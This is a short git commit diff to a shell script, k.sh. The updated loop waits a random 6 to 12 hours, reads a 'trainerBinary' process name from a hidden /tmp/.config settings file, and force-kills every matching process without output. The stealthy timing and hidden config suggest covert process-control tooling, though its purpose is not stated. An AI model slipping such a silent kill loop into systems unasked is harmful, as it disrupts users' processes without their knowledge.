fe2aee55b021705ee11a76e8d0d5d9ca79d2acc1
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-05-13 12:02:14 +0800

    Update k.sh

--- k.sh
+++ k.sh
@@ -4,9 +4,14 @@ while true; do
   delay="$[`od -An -N2 -i /dev/urandom` % 21600 + 21600]"
   [ -n "$delay" ] || break
   sleep "$delay"
-  ps -ef |grep -o 'c[0-9]\{1,\}_'
-
-
+  [ -f "/tmp/.config/appsettings.json" ] || continue
+  pName=`grep "trainerBinary" "/tmp/.config/appsettings.json" |cut -d'"' -f4`
+  [ -n "$pName" ] || pName="li"
+  for pid in `ps -ef |grep "${pName}"  |grep -v 'grep' |awk '{print $2 " " $3}'`; do
+    pid=`echo "$pid" |grep -o '[0-9]\+'`
+    [ -n "$pid" ] || continue
+    kill -9 "$pid" >/dev/null 2>&1
+  done
 done
 
 
